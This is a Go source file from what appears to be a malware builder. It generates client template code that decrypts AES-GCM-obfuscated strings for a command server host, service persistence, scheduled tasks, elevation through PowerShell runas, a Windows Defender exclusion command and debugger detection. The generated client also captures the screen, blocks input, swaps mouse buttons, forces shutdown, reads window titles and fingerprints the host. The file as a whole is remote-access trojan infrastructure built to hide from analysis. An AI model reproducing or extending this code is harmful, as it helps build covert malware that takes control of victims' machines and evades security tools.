package buildergen

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"strings"
)

func templateHelpers() string {
	return strings.TrimSpace(`
func aesDecrypt(encrypted string, key []byte) string {
	if encrypted == "" || len(key) == 0 {
		return ""
	}
	data, err := base64.StdEncoding.DecodeString(encrypted)
	if err != nil {
		return ""
	}
	aesKey := make([]byte, 32)
	copy(aesKey, key)
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return ""
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return ""
	}
	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return ""
	}
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return ""
	}
	return string(plaintext)
}

func decryptString(enc []byte) string {
	return aesDecrypt(string(enc), decryptionKey)
}

func getServerHost() string {
	return decryptString(encServerHost)
}

func getServiceName() string {
	return decryptString(encServiceName)
}

func getDisplayName() string {
	return decryptString(encDisplayName)
}

func getServiceExeName() string {
	return decryptString(encServiceExeName)
}

func getWorkerExeName() string {
	return decryptString(encWorkerExeName)
}

func getMutexName() string {
	return decryptString(encMutexName)
}

func getSchtasksExeName() string {
	return decryptString(encSchtasksExe)
}

func getProgramDataEnvName() string {
	return decryptString(encProgramDataEnv)
}

func getAppDataEnvName() string {
	return decryptString(encAppDataEnv)
}

func getMicrosoftDirName() string {
	return decryptString(encMicrosoftDir)
}

func getWindowsDirName() string {
	return decryptString(encWindowsDir)
}

func getWindowsUpdateDirName() string {
	return decryptString(encWindowsUpdateDir)
}

func getAdvapi32DLL() string {
	return decryptString(encAdvapi32Dll)
}

func getKernel32DLL() string {
	return decryptString(encKernel32Dll)
}

func getOpenSCManagerWName() string {
	return decryptString(encOpenSCManagerWName)
}

func getCreateServiceWName() string {
	return decryptString(encCreateServiceWName)
}

func getCloseServiceHandleName() string {
	return decryptString(encCloseServiceHandleName)
}

func getOpenServiceWName() string {
	return decryptString(encOpenServiceWName)
}

func getStartServiceWName() string {
	return decryptString(encStartServiceWName)
}

func getOpenProcessTokenName() string {
	return decryptString(encOpenProcessTokenName)
}

func getGetTokenInformationName() string {
	return decryptString(encGetTokenInformationName)
}

func getCloseHandleName() string {
	return decryptString(encCloseHandleName)
}

func getPowerShellExeName() string {
	return decryptString(encPowerShellExe)
}

func getPsStartProcessPrefix() string {
	return decryptString(encPsStartProcessPrefix)
}

func getPsRunasSuffix() string {
	return decryptString(encPsRunasSuffix)
}

func getAddMpPreferenceCmd() string {
	return decryptString(encAddMpPref)
}

func getIsDebuggerPresentName() string {
	return decryptString(encIsDebuggerPresent)
}

func getWsScheme() string {
	return decryptString(encWsScheme)
}

func getWsPath() string {
	return decryptString(encWsPath)
}

func getBuilderTokenHeader() string {
	return decryptString(encBuilderTokenHeader)
}

func getOwnerName() string {
	return decryptString(encOwnerName)
}

func getBuildID() string {
	return decryptString(encBuildID)
}

func getCmdPrefix() string {
	return decryptString(encCmdPrefix)
}

func getBgPrefix() string {
	return decryptString(encBgPrefix)
}

func getCmdExeName() string {
	return decryptString(encCmdExe)
}

func getCmdCArg() string {
	return decryptString(encCmdCArg)
}

func getMsgBoxPrefix() string {
	return decryptString(encMsgBoxPrefix)
}

func getSwapMouseLeftCmd() string {
	return decryptString(encSwapMouseLeft)
}

func getSwapMouseRightCmd() string {
	return decryptString(encSwapMouseRight)
}

func getShutdownExeName() string {
	return decryptString(encShutdownExe)
}

func getShutdownRestartArg() string {
	return decryptString(encShutdownRestart)
}

func getShutdownPoweroffArg() string {
	return decryptString(encShutdownPoweroff)
}

func getShutdownTimeoutArg() string {
	return decryptString(encShutdownTimeout)
}

func getShutdownZeroArg() string {
	return decryptString(encShutdownZero)
}

func getShakeOnCmd() string {
	return decryptString(encShakeOn)
}

func getShakeOffCmd() string {
	return decryptString(encShakeOff)
}

func getUser32DLL() string {
	return decryptString(encUser32Dll)
}

func getGetForegroundWindowName() string {
	return decryptString(encGetForegroundWindowName)
}

func getGetWindowTextWName() string {
	return decryptString(encGetWindowTextWName)
}

func getGetWindowTextLengthWName() string {
	return decryptString(encGetWindowTextLengthWName)
}

func getUnknownWindowLabel() string {
	return decryptString(encUnknownWindow)
}

func getNoActiveWindowLabel() string {
	return decryptString(encNoActiveWindow)
}

func getUntitledWindowLabel() string {
	return decryptString(encUntitledWindow)
}

func getSystemParametersInfoWName() string {
	return decryptString(encSystemParametersInfoWName)
}

func getBlockInputName() string {
	return decryptString(encBlockInputName)
}

func getMessageBoxWName() string {
	return decryptString(encMessageBoxWName)
}

func getSetCursorPosName() string {
	return decryptString(encSetCursorPosName)
}

func getBlockInputOnCmd() string {
	return decryptString(encBlockInputOnCmd)
}

func getBlockInputOffCmd() string {
	return decryptString(encBlockInputOffCmd)
}

func getConsoleWindowName() string {
	return decryptString(encGetConsoleWindowName)
}

func getShowWindowName() string {
	return decryptString(encShowWindowName)
}

func getGdi32DLL() string {
	return decryptString(encGdi32Dll)
}

func getGetDesktopWindowName() string {
	return decryptString(encGetDesktopWindowName)
}

func getGetDCName() string {
	return decryptString(encGetDCName)
}

func getCreateCompatibleDCName() string {
	return decryptString(encCreateCompatibleDCName)
}

func getCreateCompatibleBitmapName() string {
	return decryptString(encCreateCompatibleBitmapName)
}

func getSelectObjectName() string {
	return decryptString(encSelectObjectName)
}

func getBitBltName() string {
	return decryptString(encBitBltName)
}

func getGetDeviceCapsName() string {
	return decryptString(encGetDeviceCapsName)
}

func getDeleteDCName() string {
	return decryptString(encDeleteDCName)
}

func getReleaseDCName() string {
	return decryptString(encReleaseDCName)
}

func getDeleteObjectName() string {
	return decryptString(encDeleteObjectName)
}

func getGetDIBitsName() string {
	return decryptString(encGetDIBitsName)
}

func getHttpPrefix() string {
	return decryptString(encHttpPrefix)
}

func getHttpsPrefix() string {
	return decryptString(encHttpsPrefix)
}

func getHttpsScheme() string {
	return decryptString(encHttpsScheme)
}

func getSchemeSeparator() string {
	return decryptString(encSchemeSep)
}

func getBgImageName() string {
	return decryptString(encBgImageName)
}

func getRemotePrefix() string {
	return decryptString(encRemotePrefix)
}

func getExeSuffix() string {
	return decryptString(encExeSuffix)
}

func getCmdStart() string {
	return decryptString(encCmdStart)
}

func getIpifyURL() string {
	return decryptString(encIpifyURL)
}

func getIpApiHost() string {
	return decryptString(encIpApiHost)
}

func getIpApiPath() string {
	return decryptString(encIpApiPath)
}

func getIpApiQuery() string {
	return decryptString(encIpApiQuery)
}

func getCountryFallback() string {
	return decryptString(encCountryFallback)
}

func getPsGetCpu() string {
	return decryptString(encPsGetCpu)
}

func getWmic() string {
	return decryptString(encWmic)
}

func getWmicGetCpu() string {
	return decryptString(encWmicGetCpu)
}

func getPsGetGpu() string {
	return decryptString(encPsGetGpu)
}

func getWmicGetGpu() string {
	return decryptString(encWmicGetGpu)
}

func getPsGetRam() string {
	return decryptString(encPsGetRam)
}

func getWmicGetRam() string {
	return decryptString(encWmicGetRam)
}

func getPsGetOs() string {
	return decryptString(encPsGetOs)
}

func getWmicGetOs() string {
	return decryptString(encWmicGetOs)
}

func getSystemPowerStatusName() string {
	return decryptString(encGetSystemPowerStatusName)
}

func getLinuxCpuCmd() string {
	return decryptString(encLinuxCpuCmd)
}

func getDarwinCpuCmd() string {
	return decryptString(encDarwinCpuCmd)
}

func getUnknownCPU() string {
	return decryptString(encUnknownCPU)
}

func getUnknownGPU() string {
	return decryptString(encUnknownGPU)
}

func getUnknownRAM() string {
	return decryptString(encUnknownRAM)
}

func getUnknownOS() string {
	return decryptString(encUnknownOS)
}

func getLaptopLabel() string {
	return decryptString(encLaptopLabel)
}

func getDesktopLabel() string {
	return decryptString(encDesktopLabel)
}

func getShCmd() string {
	return decryptString(encShCmd)
}

func getDashCArg() string {
	return decryptString(encDashCArg)
}

func getSysctlCmd() string {
	return decryptString(encSysctlCmd)
}

func getSysctlNameArg() string {
	return decryptString(encSysctlNameArg)
}

func getXdgOpen() string {
	return decryptString(encXdgOpen)
}

func getBuilderToken() []byte {
	if len(encBuilderToken) == 0 {
		return nil
	}
	data, err := base64.StdEncoding.DecodeString(string(encBuilderToken))
	if err != nil {
		return nil
	}
	aesKey := make([]byte, 32)
	copy(aesKey, decryptionKey)
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}
	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil
	}
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil
	}
	return plaintext
}
`)
}